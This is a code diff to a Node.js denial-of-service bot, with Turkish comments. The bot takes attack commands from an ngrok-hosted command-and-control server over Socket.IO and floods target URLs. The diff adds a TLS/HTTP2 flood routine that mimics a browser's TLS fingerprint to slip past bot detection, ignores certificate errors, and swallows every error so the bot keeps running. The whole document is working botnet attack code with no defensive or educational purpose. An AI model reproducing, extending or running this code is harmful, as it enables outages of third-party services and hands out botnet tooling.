@@ -3,9 +3,11 @@ const http = require('http');
 const https = require('https');
 const { URL } = require('url');
 const crypto = require('crypto');
+const tls = require('tls');
+const http2 = require('http2');
 
 // WebSocket bağlantısı
-const socket = io('https://22e1-51-178-142-158.ngrok-free.app');
+const socket = io('https://399f-176-240-67-94.ngrok-free.app');
 
 let isFlooding = false;
 let floodingTimeout;
@@ -25,6 +27,9 @@ socket.on('new_message', (data) => {
   } else if (data && data.method === 'http-mix') {
     console.log('HTTP Mix saldırısı başlatılıyor...');
     startFlooding(data.url, data.port, data.duration, 'http-mix');
+  } else if (data && data.method === 'tls') {
+    console.log('TLS saldırısı başlatılıyor...');
+    startTlsFlooding(data.url, data.duration);
   } else if (data && data.method === 'stopAttack') {
     console.log('Saldırı durduruluyor...');
     stopFlooding();
@@ -110,9 +115,16 @@ function generateRandomHeaders() {
 function generateRandomData() {
   return JSON.stringify({
     username: crypto.randomBytes(8).toString('hex'),
-    email: crypto.randomBytes(12).toString('hex') + '@example.com',
+    email: crypto.randomBytes(12).toString('hex') + '@gmail.com',
     message: crypto.randomBytes(16).toString('hex')
   });
+}
+
+// Flood saldırısını durdurma fonksiyonu
+function stopFlooding() {
+  isFlooding = false;
+  clearTimeout(floodingTimeout);
+  console.log('Saldırı durduruldu.');
 }
 
 // HTTP Flood ve HTTP Mix saldırısını başlatma fonksiyonu
@@ -151,6 +163,7 @@ function startFlooding(targetUrl, port, duration, method) {
   }
 }
 
+
 // İstek gönderme fonksiyonu
 function sendRequest(targetUrl, protocol, port, method) {
   const postData = (method === 'POST' || method === 'PUT') ? generateRandomData() : null;
@@ -172,7 +185,7 @@ function sendRequest(targetUrl, protocol, port, method) {
   });
 
   req.on('error', (error) => {
-    console.error('Hata:', error.message);
+    
   });
 
   if (postData) {
@@ -181,9 +194,112 @@ function sendRequest(targetUrl, protocol, port, method) {
   req.end();
 }
 
-// Flood saldırısını durdurma fonksiyonu
-function stopFlooding() {
-  isFlooding = false;
-  clearTimeout(floodingTimeout);
-  console.log('Saldırı durduruldu.');
+process.on('uncaughtException', () => {});
+
+process.on('unhandledRejection', () => {});
+
+function startTlsFlooding(targetUrl, duration) {
+  const parsedTarget = new URL(targetUrl);
+
+  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+  const ciphers = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
+  ].join(":");
+
+  const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
+  const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
+
+  const secureOptions =
+    crypto.constants.SSL_OP_NO_SSLv2 |
+    crypto.constants.SSL_OP_NO_SSLv3 |
+    crypto.constants.SSL_OP_NO_TLSv1 |
+    crypto.constants.SSL_OP_NO_TLSv1_1;
+
+  const secureProtocol = "TLS_client_method";
+  const secureContext = tls.createSecureContext({
+    ciphers: ciphers,
+    sigalgs: sigalgs,
+    honorCipherOrder: true,
+    secureOptions: secureOptions,
+    secureProtocol: secureProtocol
+  });
+
+  isFlooding = true;
+
+  floodingTimeout = setTimeout(() => {
+    stopFlooding();
+  }, duration);
+
+  const settings = {
+    enablePush: false,
+    initialWindowSize: 1073741823
+  };
+
+  (function flood() {
+    if (!isFlooding) return; // Saldırı kontrolü
+    const tlsOptions = {
+      secure: true,
+      ALPNProtocols: ["h2"],
+      ciphers: ciphers,
+      sigalgs: sigalgs,
+      ecdhCurve: ecdhCurve,
+      secureOptions: secureOptions,
+      secureContext: secureContext,
+      servername: parsedTarget.hostname,
+      rejectUnauthorized: false,
+      secureProtocol: secureProtocol
+    };
+
+    try {
+      const tlsConn = tls.connect(parsedTarget.port || 443, parsedTarget.hostname, tlsOptions);
+
+      tlsConn.setKeepAlive(true, 60000);
+      tlsConn.setNoDelay(true);
+
+      const client = http2.connect(parsedTarget.href, {
+        protocol: "https:",
+        settings: settings,
+        createConnection: () => tlsConn
+      });
+
+      client.on("connect", () => {
+        const interval = setInterval(() => {
+          if (!isFlooding) { // Saldırı durdurulduğunda bağlantıyı temizle
+            clearInterval(interval);
+            client.destroy();
+            return;
+          }
+          try {
+            for (let i = 0; i < 8; i++) {
+              const headers = generateRandomHeaders();
+              const request = client.request(headers)
+                .on("response", () => {
+                  request.close();
+                  request.destroy();
+                });
+              request.end();
+            }
+          } catch (err) {
+            // Hataları sessizce yoksay
+          }
+        }, 1000);
+      });
+
+      client.on("close", () => {
+        client.destroy();
+      });
+
+      client.on("error", () => {
+        // Hataları sessizce yoksay
+      });
+
+    } catch (err) {
+      // Hataları sessizce yoksay
+    }
+
+    setTimeout(flood, 0);
+  })();
 }
